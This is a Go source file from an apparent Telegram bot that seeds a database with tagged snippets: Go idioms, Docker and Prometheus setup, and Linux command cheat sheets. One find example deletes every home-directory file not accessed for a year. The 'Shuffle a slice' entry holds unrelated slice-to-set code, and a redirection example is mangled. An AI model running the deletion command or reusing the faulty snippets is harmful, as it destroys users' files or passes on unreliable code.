package golang

import (
	"gorm.io/gorm"
	"tbot/internal/errors"
)

func initialize(db *gorm.DB) {
	err := db.AutoMigrate(&Topic{}, &Tag{})
	//err := db.Debug().AutoMigrate(&Topic{}, &Tag{})
	errors.PanicIfErr(err)

	create(db, "Get executable dir\n(tags: executable dir)\n---\n\nex, err := os.Executable()\ndir := filepath.Dir(ex)\nfmt.Println(\"dir:\", dir)\n")
	create(db, "Extract beginning of string (prefix)\n(tags: extract beginning string prefix)\n---\n\nt := string([]rune(s)[:5])")
	create(db, "Extract string suffix\n(tags: extract string suffix)\n---\n\nt := string([]rune(s)[len([]rune(s))-5:])")
	create(db, "Exec other program\n(tags: exec program)\n---\n\nerr := exec.Command(\"program\", \"arg1\", \"arg2\").Run()")
	create(db, "Telegram message markdown\n(tags: telegram message markdown)\n---\n\n*полужирный*\n_курсив_\n[ссылка](http://www.example.com/)\n`строчный моноширинный`\n```text\nблочный моноширинный (можно писать код)\n```\n\nimport \"github.com/go-telegram-bot-api/telegram-bot-api\"\n\nmsg := tgbotapi.NewMessage(update.Message.Chat.ID, update.Message.Text)\nmsg.ParseMode = \"markdown\" //msg.ParseMode = tgbotapi.ModeMarkdown")
	create(db, "Telegram message html\n(tags: telegram message html)\n---\n\n<b>полужирный</b>, <strong>полужирный</strong>\n<i>курсив</i>\n<a href=\"http://www.example.com/\">ссылка</a>\n<code>строчный моноширинный</code>\n<pre>блочный моноширинный (можно писать код)</pre>\n\nimport \"github.com/go-telegram-bot-api/telegram-bot-api\"\n\nmsg := tgbotapi.NewMessage(update.Message.Chat.ID, update.Message.Text)\nmsg.ParseMode = \"HTML\" //msg.ParseMode = tgbotapi.ModeHTML")
	create(db, "Iterate over map entries ordered by keys\n(tags: iterate map order key)\n---\n\nkeys := make([]string, 0, len(mymap))\nfor k := range mymap {\n    keys = append(keys, k)\n}\nsort.Strings(keys)\nfor _, k := range keys {\n    x := mymap[k]\n    fmt.Println(\"Key =\", k, \", Value =\", x)\n}\n")
	create(db, "Iterate over map entries ordered by values\n(tags: iterate map order value)\n---\n\ntype entry struct {\n    key   string\n    value int\n}\nentries := make([]entry, 0, len(mymap))\nfor k, x := range mymap {\n    entries = append(entries, entry{key: k, value: x})\n}\nsort.Slice(entries, func(i, j int) bool {\n    return entries[i].value < entries[j].value\n})\nfor _, e := range entries {\n    fmt.Println(\"Key =\", e.key, \", Value =\", e.value)\n}")
	create(db, "Slice to set\n(tags: slice set)\n---\n\ny := make(map[T]struct{}, len(x))\nfor _, v := range x {\n    y[v] = struct{}{}\n}")
	create(db, "Deduplicate slice\n(tags: deduplicate slice remove duplicate)\n---\n\nseen := make(map[T]bool)\nj := 0\nfor _, v := range x {\n    if !seen[v] {\n        x[j] = v\n        j++\n        seen[v] = true\n    }\n}\nfor i := j; i < len(x); i++ {\n    x[i] = nil\n}\nx = x[:j]")
	create(db, "Shuffle a slice\n(tags: slice shuffle)\n---\n\ny := make(map[T]struct{}, len(x))\nfor _, v := range x {\n    y[v] = struct{}{}\n}")
	create(db, "Sort slice asc\n(tags: sort slice asc)\n---\n\nsort.Slice(items, func(i, j int) bool {\n    return items[i].p < items[j].p\n})")
	create(db, "Sort slice desc\n(tags: sort slice desc)\n---\n\nsort.Slice(items, func(i, j int) bool {\n    return items[i].p > items[j].p\n})")
	create(db, "Remove item from slice by index\n(tags: remove item slice index)\n---\n\nitems = append(items[:i], items[i+1:]...)")
	create(db, "Graph with adjacency lists\n(tags: graph struct)\n---\n\ntype Vertex struct{\n    Id int\n    Label string\n    Neighbours map[*Vertex]bool\n}\ntype Graph []*Vertex")
	create(db, "Reverse a string\n(tags: string reverse)\n---\n\nrunes := []rune(s)\nfor i, j := 0, len(runes)-1; i < j; i, j = i+1, j-1 {\n   runes[i], runes[j] = runes[j], runes[i]\n}\nt := string(runes)")
	create(db, "Insert item in slice\n(tags: insert item slice)\n---\n\ns = append(s, 0)\ncopy(s[i+1:], s[i:])\ns[i] = x")
	create(db, "Filter slice\n(tags: filter slice)\n---\n\ny := make([]T, 0, len(x))\nfor _, v := range x{\n    if p(v){\n        y = append(y, v)\n    }\n}")
	create(db, "File content to string\n(tags: file content string)\n---\n\nb, err := ioutil.ReadFile(f)\nlines := string(b)")
	create(db, "Write to std error\n(tags: write std error)\n---\n\nfmt.Fprintln(os.Stderr, x, \"is negative\")")
	create(db, "Big int\n(tags: big integer)\n---\n\nx := new(big.Int)\nx.Exp(big.NewInt(3), big.NewInt(247), nil)")
	create(db, "Round float to int\n(tags: round float int)\n---\n\ny := int(math.Floor(x + 0.5))")
	create(db, "Check if int addition will overflow\n(tags: check int add overflow)\n---\n\nfunc willAddOverflow(a, b int64) bool {\n    return a > math.MaxInt64 - b\n}")
	create(db, "Check if int multiplication will overflow\n(tags: check int multiply overflow)\n---\n\nfunc multiplyWillOverflow(x, y uint64) bool {\n   if x <= 1 || y <= 1 {\n     return false\n   }\n   d := x * y\n   return d/y != x\n}")
	create(db, "Load json file into struct\n(tags: load json file struct)\n---\n\nbuffer, err := ioutil.ReadFile(\"data.json\")\nerr = json.Unmarshal(buffer, &x)")
	create(db, "Load yaml file into struct\n(tags: load yaml file struct)\n---\n\nimport \"gopkg.in/yaml.v3\"\n\nbuffer, err := ioutil.ReadFile(\"data.yaml\")\nerr = yaml.Unmarshal(buffer, &x)")
	create(db, "Save struct into json file\n(tags: save struct json file)\n---\n\nbuffer, err := json.MarshalIndent(x, \"\", \"  \")\nerr = ioutil.WriteFile(\"data.json\", buffer, 0644)")
	create(db, "Print type of variable\n(tags: print type variable)\n---\n\nfmt.Printf(\"%T\", x) //fmt.Println(reflect.TypeOf(x))")
	create(db, "Load from HTTP GET request into a string\n(tags: load http get string)\n---\n\nres, err := http.Get(u)\nbuffer, err := ioutil.ReadAll(res.Body)\nres.Body.Close()\ns := string(buffer)")
	create(db, "Read int from stdin\n(tags: read int std in)\n---\n\n_, err := fmt.Scan(&n)")
	create(db, "UDP listen and read\n(tags: udp listen read)\n---\n\nServerAddr,err := net.ResolveUDPAddr(\"udp\",p)\nServerConn, err := net.ListenUDP(\"udp\", ServerAddr)\ndefer ServerConn.Close()\nn,addr,err := ServerConn.ReadFromUDP(b[:1024])\nif n<1024 {\n    return fmt.Errorf(\"Only %d bytes could be read.\", n)\n}")
	create(db, "Binary search in sorted slice\n(tags: binary search slice)\n---\n\nfunc binarySearch(a []T, x T) int {\n    imin, imax := 0, len(a)-1\n    for imin <= imax {\n        imid := (imin + imax) / 2\n        switch {\n        case a[imid] == x:\n        return imid\n        case a[imid] < x:\n        imin = imid + 1\n        default:\n        imax = imid - 1\n        }\n    }\n    return -1\n}")
	create(db, "Measure func call duration\n(tags: measure func call duration time)\n---\n\nt1 := time.Now()\nfoo()\nt := time.Since(t1)\nns := t.Nanoseconds()\nfmt.Printf(\"%dns\\n\", ns)\n\nor \n\nfunc Duration(invocation time.Time, name string) {\n  elapsed := time.Since(invocation)\n  log.Printf(\"%s lasted %s\", name, elapsed)\n}\nfunc BigIntFactorial(x big.Int) *big.Int {\n  defer profile.Duration(time.Now(), \"IntFactorial\")\n\n  y := big.NewInt(1)\n  for one := big.NewInt(1); x.Sign() > 0; x.Sub(x, one) {\n    y.Mul(y, x)\n  }\n  return x.Set(y)\n}")
	create(db, "Breadth-first traversing in a graph\n(tags: bfs traversing graph)\n---\n\nfunc (start *Vertex) Bfs(f func(*Vertex)) {\n    queue := []*Vertex{start}\n    seen := map[*Vertex]bool{start: true}\n    for len(queue) > 0 {\n        v := queue[0]\n        queue = queue[1:]\n        f(v)\n        for next, isEdge := range v.Neighbours {\n            if isEdge && !seen[next] {\n                queue = append(queue, next)\n                seen[next] = true\n            }\n        }\n    }\n}")
	create(db, "Depth-first traversing in a graph\n(tags: dfs traversing graph)\n---\n\nfunc (v *Vertex) Dfs(f func(*Vertex), seen map[*Vertex]bool) {\n    seen[v] = true\n    f(v)\n    for next, isEdge := range v.Neighbours {\n        if isEdge && !seen[next] {\n            next.Dfs(f, seen)\n        }\n    }\n}")
	create(db, "Check if string contains only digits\n(tags: check string contains only digits)\n---\n\nisNotDigit := func(c rune) bool { return c < '0' || c > '9' }\nb := strings.IndexFunc(s, isNotDigit) == -1")
	create(db, "Check if file exists\n(tags: check file exist)\n---\n\n_, err := os.Stat(fp)\nb := !os.IsNotExist(err)")
	create(db, "Read slice of int from stdin\n(tags: read slice int std in)\n---\n\nvar ints []int\ns := bufio.NewScanner(os.Stdin)\nfor s.Scan() {\n    i, err := strconv.Atoi(s.Text())\n    if err == nil {\n        ints = append(ints, i)\n    }\n}")
	create(db, "Detect if 32-bit or 64-bit architecture\n(tags: detect 32 64 architecture)\n---\n\nif strconv.IntSize==32 {\n    f32()\n}\nif strconv.IntSize==64 {\n    f64()\n}")
	create(db, "Parse flags\n(tags: parse flags args)\n---\n\nvar b = flag.Bool(\"b\", false, \"Do bat\")\nfunc main() {\n    flag.Parse()\n    if *b {\n        bar()\n    }\n}")
	create(db, "Open URL in default browser\n(tags: open url default browser)\n---\n\nfunc openbrowser(url string) {\n    var err error\n    switch runtime.GOOS {\n    case \"linux\":\n        err = exec.Command(\"xdg-open\", url).Start()\n    case \"windows\":\n        err = exec.Command(\"rundll32\", \"url.dll,FileProtocolHandler\", url).Start()\n    case \"darwin\":\n        err = exec.Command(\"open\", url).Start()\n    default:\n        err = fmt.Errorf(\"unsupported platform\")\n    }\n    if err != nil {\n        log.Fatal(err)\n    }\n}")
	create(db, "Concatenate two slices\n(tags: concat two slice)\n---\n\nab := append(a, b...)")
	create(db, "String length\n(tags: string length)\n---\n\nn := utf8.RuneCountInString(s)")
	create(db, "Make HTTP POST request\n(tags: make http post request)\n---\n\nresponse, err := http.Post(u, contentType, body)")
	create(db, "Bytes to hex string\n(tags: byte hex string)\n---\n\ns := hex.EncodeToString(a)")
	create(db, "Hex string to byte array\n(tags: byte hex string)\n---\n\na, err := hex.DecodeString(s)")
	create(db, "Find files with a given list of filename extensions\n(tags: file extension walk)\n---\n\nL := []string{}\nerr := filepath.Walk(D, func(path string, info os.FileInfo, err error) error {\n    if err != nil {\n        fmt.Printf(\"failure accessing a path %q: %v\\n\", path, err)\n        return err\n    }\n    for _, ext := range []string{\".jpg\", \".jpeg\", \".png\"} {\n        if strings.HasSuffix(path, ext) {\n            L = append(L, path)\n            break\n        }\n    }\n    return nil\n})\n")
	create(db, "Check if point is inside rectangle\n(tags: check point inside rect)\n---\n\np := image.Pt(x, y)\nr := image.Rect(x1, y1, x2, y2)\nb := p.In(r)")
	create(db, "List files in directory\n(tags: list file dir)\n---\n\nx, err := ioutil.ReadDir(d)")
	create(db, "Make HTTP PUT request\n(tags: make http put request)\n---\n\nreq, err := http.NewRequest(\"PUT\", u, body)\nreq.Header.Set(\"Content-Type\", contentType)\nreq.ContentLength = contentLength\nresponse, err := http.DefaultClient.Do(req)")
	create(db, "Execute function in 30 seconds\n(tags: exec func after time)\n---\n\ntimer := time.AfterFunc(\n    30*time.Second,\n    func() {\n        f(42)\n    })")
	create(db, "Matrix multiplication\n(tags: matrix multiply)\n---\n\nc := new(mat.Dense)\nc.Mul(a, b)")
	create(db, "Filter and transform slice\n(tags: filter transform slice)\n---\n\nvar y []Result\nfor _, e := range x {\n    if P(e) {\n        y = append(y, T(e))\n    }\n}")
	create(db, "Get an environment variable\n(tags: env var)\n---\n\nfoo, ok := os.LookupEnv(\"FOO\")\nif !ok {\n    foo = \"none\"\n}")
	create(db, "Create folder\n(tags: create folder dir)\n---\n\nerr := os.MkdirAll(path, os.ModeDir)")
	create(db, "Pad string on the right\n(tags: pad string right)\n---\n\nif n := utf8.RuneCountInString(s); n < m {\n    s += strings.Repeat(c, m-n)\n}")
	create(db, "Pad string on the left\n(tags: pad string left)\n---\n\nif n := utf8.RuneCountInString(s); n < m {\n    s = strings.Repeat(c, m-n) + s\n}")
	create(db, "Progress bar\n(tags: progress bar)\n---\n\nfunc printProgressBar(n int, total int) {\n    var bar []string\n    tantPerFourty := int((float64(n) / float64(total)) * 40)\n    tantPerCent := int((float64(n) / float64(total)) * 100)\n    for i := 0; i < tantPerFourty; i++ {\n        bar = append(bar, \"█\")\n    }\n    progressBar := strings.Join(bar, \"\")\n    fmt.Printf(\"\\r \" + progressBar + \" - \" + strconv.Itoa(tantPerCent) + \"\")\n}")
	create(db, "Create a zip archive\n(tags: create zip archive)\n---\n\nbuf := new(bytes.Buffer)\nw := zip.NewWriter(buf)\nfor _, filename := range list {\n    input, err := os.Open(filename)\n    output, err := w.Create(filename)\n    _, err = io.Copy(output, input)\n}\nerr := w.Close()\nerr = ioutil.WriteFile(name, buf.Bytes(), 0777)")
	create(db, "Slice intersection\n(tags: slice intersection)\n---\n\nseta := make(map[T]bool, len(a))\nfor _, x := range a {\n    seta[x] = true\n}\nsetb := make(map[T]bool, len(a))\nfor _, y := range b {\n    setb[y] = true\n}\n\nvar c []T\nfor x := range seta {\n    if setb[x] {\n        c = append(c, x)\n    }\n}")
	create(db, "Replace multiple spaces with single space\n(tags: replace space)\n---\n\nwhitespaces := regexp.MustCompile('\\s+')\nt := whitespaces.ReplaceAllString(s, \" \")")
	create(db, "Create a tuple value\n(tags: create tuple interface)\n---\n\nt := []interface{}{\n    2.5,\n    \"hello\",\n    make(chan int),\n}")
	create(db, "Remove all non-digits chars\n(tags: remove digit char)\n---\n\nre := regexp.MustCompile(\"[^\\\\d]\")\nt := re.ReplaceAllLiteralString(s, \"\")")
	create(db, "Add element to the beginning of the slice\n(tags: add beginning slice)\n---\n\nitems = append([]T{x}, items...)")
	create(db, "Copy slice\n(tags: copy slice)\n---\n\ny := make([]T, len(x))\ncopy(y, x)")
	create(db, "Copy file\n(tags: copy file)\n---\n\nfunc copy(dst, src string) error {\n    data, err := ioutil.ReadFile(src)\n    stat, err := os.Stat(src)\n    return ioutil.WriteFile(dst, data, stat.Mode())\n}")
	create(db, "Cancel an operation\n(tags: cancel operation func)\n---\n\nctx, cancel := context.WithCancel(context.Background())\ngo p(ctx)\nsomethingElse()\ncancel()")
	create(db, "Timeout\n(tags: timeout operation func)\n---\n\nctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)\ndefer cancel()\np(ctx)")
	create(db, "Check if bytes are a valid UTF-8 string\n(tags: check byte valid utf8)\n---\n\nb := utf8.Valid(s)")
	create(db, "Encode bytes to base64\n(tags: encode byte base64)\n---\n\ns := base64.StdEncoding.EncodeToString(data)")
	create(db, "Decode base64\n(tags: decode string base64)\n---\n\ndata, err := base64.StdEncoding.DecodeString(s)")
	create(db, "Set value on field of structure in map\n(tags: set value field struct map)\n---\n\ntemp := m[key]\ntemp.SomeField = 42\nm[key] = temp")
	create(db, "Deploy on Heroku\n(tags: heroku deploy)\n---\n\nCheck this:\n1. On site heroku/<myappname>/recources web toggle button turn on\n2. In code http.ListenAndServe(\":\" + os.Getenv(\"PORT\"), nil)\n3. In root app's dir you have \"Procfile\" with \"web: bin/myapp\"\n4. File go.mod have \"// +heroku goVersion go1.15\" above the line \"go 1.15\"")
	create(db, "HTTP file server\n(tags: http file server)\n---\n\nhttp.Handle(\"/\", http.FileServer(http.Dir(\".\")))\nhttp.ListenAndServe(\":80\", nil)\n// log.Fatal(http.ListenAndServe(\":8080\", http.FileServer(http.Dir(\"/usr/share/doc\"))))")
	create(db, "Update major version of package in go.mod\n(tags: update major version package mod)\n---\n\n// go mod init myapp\n// go mod vendor\nadd version on import github.com/go-telegram-bot-api/telegram-bot-api/v5 \nor if you want to use the newest commit\ngo get github.com/go-telegram-bot-api/telegram-bot-api@b6df6c2\ngo mod tidy")
	create(db, "Using go mod vendor\n(tags: mod vendor)\n---\n\ngo mod init myapp\ngo mod vendor\ngo build -mod=vendor main.go")
	create(db, "Linux tcpdump\n(tags: linux tcpdump)\n---\n\n// output format\n[Timestamp] [Protocol] [Src IP].[Src Port] > [Dst IP].[Dst Port]: [Flags], [Seq], [Ack], [Win Size], [Options], [Data Length]\n// show available interfaces\ntcpdump -D\n// catch all packets\ntcpdump -i any\n// catch first 5 packets\ntcpdump -i any -c 5\n// do not resolve ip (-n) and ports (-nn)\ntcpdump -i any -c5 -nn\n// filter by icmp packets\ntcpdump -i any -c5 icmp\n// filter packets by a special host\ntcpdump -i any -c5 -nn host 54.204.39.132\n// filer packets by subnet\ntcpdump -n net 192.168.1\n// filter by port\ntcpdump -i any -c5 -nn port 80\n// filter by ports\ntcpdump -n portrange 11128-11142\n// filter by destination \ntcpdump -i any -c5 -nn dst 192.168.122.98\n// complexly\ntcpdump -i any -c5 -nn src 192.168.122.98 and port 80\ntcpdump -i any -c5 -nn \"port 80 and (src 192.168.122.98 or src 54.204.39.132)\"\n// print packet content in ascii (-A) or hex (-X)\ntcpdump -i any -c10 -nn -A port 80\n// save result in file\ntcpdump -i any -c10 -nn -w webserver.pcap port 80\n// read result from file (you may use wireshark)\ntcpdump -nn -r webserver.pcap\ntcpdump -nn -r webserver.pcap src 54.204.39.132")
	create(db, "Linux info\n(tags: linux info)\n---\n\nid      // info about your account\nw       // who there are in the system now\nlscpu   // info about processors\nlsof    // list of open files\nfree    // info about memory\ncat     // show content of the file\nless    // show file in fragments\nmore    // for big files\ntail -f // show end of file in interactive\ncmp     // compare files by bytes\ncomm    // show sort files string by string\ndiff    // show diff between files\ngrep    // find in text by regexp \nfind    // find files\nwc      // words count\n\nhttps://opensource.com/article/20/12/linux-server\n\nuname -a    // full user info\nhostnamectl // server info (virtual or not)\nuptime      // working time\nwho -Hu     // user info\ndmidecode -s system-product-name // virtual or not\npstree       // processes info\npstree -pa 1 //\nps -ef\nps auxf\nsystemctl\nnetstat -tulpn // network connections\nnetstat -anp\nlsof -i\nss\niptables -L -n\ncat /etc/resolv.conf\nuname -r          // kernel\ncat /proc/cmdline\nlsmod\nmodinfo <module>\nsysctl -a\ncat /boot/grub2/grub.cfg\ndmesg      // logs\njournalctl")
	create(db, "Linux bash hotkeys\n(tags: linux bash hotkeys)\n---\n\nalt+b  // move cursor to the start of word (back)\nalt+f  // move to the end of word (forward)\nctrl+a // move to the start\nctrl+e // move to the end\nctrl+]<char> // move right to first <char> entry\nctrl+alt+]<char> // move left to <char>\nctrl+w // remove word before the cursor\nalt+d  // remove word after\nctrl+u // remove all before cursor\nctrl+k // remove all after cursor\nctrl+y // return removed \n!! // repeat last command\n!$ // \"cat a.txt\" then \"less !$\" = \"less a.txt\"\n!* // \"head a.txt | grep '^Al'\" then \"tail !*\"\nalt+. // insert last arg from previous command\nalt+<N>+alt+. // insert <N> arg from previous command\n>a.txt // creat file or clean it\nctrl+l // clean terminal\nctrl+r // show history\nctrl+d // exit")
	create(db, "Linux std\n(tags: linux std in out err)\n---\n\n> send to stream\n< get from straem\n>> append to stream\n<< join stream\n// send stdout to out.txt, stderr to err.txt\n./myapp > out.txt 2> err.txt\n// send stdout and stderr in outerr.txt\n./myapp > outerr.txt 2>&1 ac -pd &> outerr.txt\n// skip stdout and stderr\n./myapp &> /dev/null\n// stdout as arg\ndiff <(ls dirA) <(ls dirB)\n// create files with names from list\nxargs touch < list.txt")
	create(db, "Linux find\n(tags: linux find)\n---\n\nfind /opt -name \"README*\" -exec wc -l {} +\n// criteria:\n-name,  -iname, -type (f, d, l), -inum <Н>, -not-name\n-user<uname>, -group<gname>,  -perm (ugo+/-rwx)\n-size +x[c], -empty, -newer <fname>\n-atime +x, -amin +x, -mmin -x, -mtime -x\n-and (-a), or (-o)\n-~ (hiden files), -perm (permissions)\n// actions:\n-print — default print\n-ls — exec ls -lids for every result file\n-exec cmd — exec command\n-ok cmd — exec command after user confirmation\n// examples:\nfind . -type f -iname \"*.txt\" — xt-files in curdir\nfind . -maxdepth 1 — equivalent ls\nfind ./somedir -type f -size +512M -print — all files large then 512M in ./somedir\nfind /usr/bin ! -type l — no symbol link in /usr/bin\nfind $HOME -type f -atime +365 -exec rm {} + — remove all files that have not been available for a year\nfind . \\( -name \"*.c\" -o -name \"*.h\" \\) — all files with .c or .h extention")
	create(db, "Linux grep\n(tags: linux grep)\n---\n\ngrep -i -n 'c.l' states.txt\n// print number of string whoes start with t\nprintf \"one\\ntwo\\nthree\\nfour\\nfive\" | grep -n '^t'\n  2:two\n  3:three\n// options:\n-i: ignore case\n-n: print string number with strings\n-v: invert - print that not matched\n-c: print count of matched strings\n-A<n>: print <n> strings after\n-B<n>: print <n> strings before\n-o: print only matched, not whole string\n-E: allowed to use extention regexp\n-r: recurcive in dirs\n-w: find word\n-l: print with file names\n--color: colorise print")
	create(db, "Linux awk\n(tags: linux awk)\n---\n\n// $0 - all string, $1 - first word, $2 - second...\necho \"I'm Tom\" | awk '{$2=\"Bill\"; print $0}' \n  I'm Bill\nprintf \"12\\n32\\n54\\n6\" | awk '{if ($1>20) print $1}'\n  32\n  54 \n// use function  \nprintf \"first a\\nsecond b\\nthird c\" | awk '{print(toupper($1))}' >&1\n  FIRST\n  SECOND\n  THIRD\n// set other word delimeter\nprintf \"first:a\\nsecond:b\\nthird:c\" | awk 'BEGIN{FS=\":\"}{print(toupper($1))}' >&1\nprintf \"first:a\\nsecond:b\\nthird:c\" | awk -F: '{print(toupper($1))}' >&1\n  FIRST\n  SECOND\n  THIRD\n// print last field\nprintf \"a b c d e f\" | awk '{print(toupper($NF))}' >&1\n  f\n// set other string delimeter and use filter\nprintf \"1a 1b 2c 2d 3e 3f\" | awk 'BEGIN{RS=\" \"}{print(toupper($NF))}' | awk '/2/{print $0}'\n  2C\n  2D\n// use variables\necho -e 'one 1\\n two 2' | awk '{sum+=$2}END{print sum}'\n  3\n// sum of values in last column in file\n< requests.log awk '{totalBytes+=$NF}END{print totalBytes}'\n// substr function (printf(string), system(command), length(string))\nprintf \"1a 1b\" | awk 'BEGIN{RS=\" \"}{print(substr($1,2,1))}'\n  a\n  b")
	create(db, "Linux sed\n(tags: linux sed)\n---\n\n// print 2-4 strings from file, show only result (-n)\nprintf \"one\\ntwo\\nthree\\nfour\\nfive\" | sed -n '2,4p'\n  two\n  three\n  four\n// print without 1-2 strings\nprintf \"one\\ntwo\\nthree\\nfour\\nfive\" | sed '1,2d'\n  three\n  four\n  five\n// replace words\nprintf \"one\\ntwo\\nthree\" | sed 's/tw/TW/g'\n  one\n  TWo\n  three\n// replace chars\nprintf \"one\\ntwo\\nthree\" | sed 'y/t/T/'\n  one\n  Two\n  Three\n// append string\n  printf \"one\\ntwo\" | sed 'a-----'\n  one\n  -----\n  two\n  -----")
	create(db, "Compile for android\n(tags: compile android)\n---\n\nenv GOOS=android GOARCH=arm64 go build main.go")
	create(db, "Cli tool\n(tags: cli tool)\n---\n\nimport \"github.com/urfave/cli/v2\"\n\nfunc main() {\n  var language string\n  app := &cli.App{\n    Flags: []cli.Flag {\n      &cli.StringFlag{\n        Name:        \"lang\",\n\t\tAliases:     []string{\"l\"},\n        Value:       \"english\",\n        Usage:       \"language for the greeting\",\n        Destination: &language,\n      },\n    },\n    Action: func(c *cli.Context) error {\n      name := \"someone\"\n      if c.NArg() > 0 {\n        name = c.Args().Get(0)\n      }\n      if language == \"spanish\" {\n        fmt.Println(\"Hola\", name)\n      } else {\n        fmt.Println(\"Hello\", name)\n      }\n      return nil\n    },\n  }\n  err := app.Run(os.Args)\n  if err != nil {\n    log.Fatal(err)\n  }\n}")
	create(db, "Linux tree\n(tags: linux tree)\n---\n\n// print only dir with low than 26 files\ntree -d --filelimit 26\n// print hiden dir, sort by depth, show modify date\ntree -avD\n// print files that matched template, do not show dir that gave not needed files\ntree -P '*.pdf' --prune\n// write three with dir into a file\ntree -d -o tree_command_results.txt\n// print size, user, permissions, full path\ntree -hupf")
	create(db, "Build go app in docker from scratch\n(tags: docker build scratch)\n---\n\nFROM golang AS builder\nADD . /app\nWORKDIR /app\nRUN CGO_ENABLED=0 go build -mod=vendor -ldflags '-extldflags \"-static\"' -o kit\n\nFROM scratch\nCOPY --from=builder /app/kit /app/kit\nEXPOSE 8080 8080\nENTRYPOINT [\"/app/kit\"]")
	create(db, "Use prometheus and grafana\n(tags: docker prometheus grafana compose)\n---\n\n// Dockerfile\nFROM golang AS builder\nADD . /app\nWORKDIR /app\nRUN CGO_ENABLED=0 go build -mod=vendor -ldflags '-extldflags \"-static\"' -o kit\n\nFROM scratch\nCOPY --from=builder /app/kit /app/kit\nEXPOSE 8080 8080\nENTRYPOINT [\"/app/kit\"]\n\n// prometheus/prometheus.yml\nscrape_configs:\n  - job_name: my_group\n    scrape_interval: 10s\n    static_configs:\n      - targets:\n          - kit:8080\n\t\t  \n// docker-compose.yaml\nversion: \"3\"\n\nservices:\n  kit:\n    build:\n      context: .\n      dockerfile: Dockerfile\n    ports:\n      - 8080:8080\n\n  grafana:\n    image: grafana/grafana\n    container_name: grafana\n    ports:\n      - 3000:3000\n\n  prometheus:\n    image: prom/prometheus\n    container_name: prometheus\n#    restart: unless-stopped\n    ports:\n      - 9090:9090\n    volumes:\n      - ./prometheus/prometheus.yml:/etc/prometheus/prometheus.yml\n\n// docker-compose up")
	create(db, "Simple metrics for prometheus\n(tags: metrics prometheus)\n---\n\nimport (\n  \"github.com/prometheus/client_golang/prometheus\"\n  \"github.com/prometheus/client_golang/prometheus/promauto\"\n  \"github.com/prometheus/client_golang/prometheus/promhttp\"\n)\n\nfunc recordMetrics() {\n  go func() {\n    for {\n      opsProcessed.Inc()\n      time.Sleep(2 * time.Second)\n    }\n  }()\n}\n\nvar opsProcessed = promauto.NewCounter(prometheus.CounterOpts{\n    Name: \"myapp_processed_ops_total\",\n    Help: \"The total number of processed events\",\n  })\n\nfunc main() {\n  recordMetrics()\n  http.Handle(\"/metrics\", promhttp.Handler())\n  http.ListenAndServe(\":8080\", nil)\n}\n// curl http://localhost:8080/metrics")
	create(db, "Install golang on android\n(tags: install android)\n---\n\n1. Install Termux from Play Market\n2. pkg install golang \n3. cd ~\n4. mkdir gopath\n5. export GOPATH=$HOME/gopath\n6. pkg install git\n7. go get github.com/gorilla/mux")
	create(db, "Unsafe for loop\n(tags: unsafe for loop)\n---\n\narr := []uint32{1, 2, 3}\nconst size = unsafe.Sizeof(uint32(0)) //4\nfor i := 0; i < len(arr); i++ {\n  fmt.Printf(\"%d \",\n    *(*uint32)( // conver into (*uint32), then take value - *(*uint32)\n      unsafe.Pointer( // get address\n        // address 0-element + offset size (4)\n        uintptr(unsafe.Pointer(&arr[0])) + (uintptr(i) * size)))) // uintptr(i) for type assign\n}")
	create(db, "Unsafe string to bytes without copy\n(tags: unsafe string byte)\n---\n\nfunc string2bytes(s string) []byte {\n  stringHeader := (*reflect.StringHeader)(unsafe.Pointer(&s))\n  bh := reflect.SliceHeader{\n    Data: stringHeader.Data,\n    Len:  stringHeader.Len,\n    Cap:  stringHeader.Len,\n  }\n  return *(*[]byte)(unsafe.Pointer(&bh))\n}")
	create(db, "Unsafe bytes to string without copy\n(tags: unsafe string byte)\n---\n\nfunc bytes2string(b []byte) string {\n  sliceHeader := (*reflect.SliceHeader)(unsafe.Pointer(&b))\n  sh := reflect.StringHeader{\n    Data: sliceHeader.Data,\n    Len:  sliceHeader.Len,\n  }\n  return *(*string)(unsafe.Pointer(&sh))\n}")
	create(db, "Unsafe change struct fields\n(tags: unsafe struct field)\n---\n\ntype Programmer struct {\n  name     string\n  language string\n}\np := Programmer{\"Tom\", \"en\"}\nname := (*string)(unsafe.Pointer(&p))\n*name = \"Foma\"\nlang := (*string)(unsafe.Pointer(uintptr(unsafe.Pointer(&p)) + unsafe.Offsetof(p.language)))\n*lang = \"ru\"")
	create(db, "Unsafe change unexported struct fields from other package\n(tags: unsafe struct field unexported)\n---\n\np2 := a.Programmer2{}\n// cannot refer to unexported field or method name (p2.name = \"Foma\")\n// but we can see in source code what the fields there. First field is string\nname2 := (*string)(unsafe.Pointer(&p2))\n*name2 = \"Foma\"\n// second field is int. Doing the offset by string size\nage2 := (*int)(unsafe.Pointer(uintptr(unsafe.Pointer(&p2)) + unsafe.Sizeof(string(\"\"))))\n*age2 = 25\n// third field is string\nlang2 := (*string)(unsafe.Pointer(uintptr(unsafe.Pointer(&p2)) + unsafe.Sizeof(string(\"\")) + unsafe.Sizeof(int(0))))\n*lang2 = \"ru\"")
	create(db, "Json marshal infinity float to null\n(tags: json marshal float nan infinity)\n---\n\ntype Measure struct {\n  Type  string   `json:\"type\"`\n  Power *float64 `json:\"power\"`\n}\n\nfunc main() {\n  val := math.Inf(1)\n  power := &val\n  if math.IsInf(val, 0) {\n  \tpower = nil\n  }\n  m := Measure{\n  \tType: \"simple\",\n  \tPower: power,\n  }\n  j, _ := json.Marshal(&m)\n  fmt.Println(string(j)) // {\"type\":\"simple\",\"power\":null}\n}")
	create(db, "Scan arguments in string by template\n(tags: scan arg string)\n---\n\nvar name string\nvar age int\nn, err := fmt.Sscanf(\"Joe is 22 years old\", \"%s is %d years old\", &name, &age)")
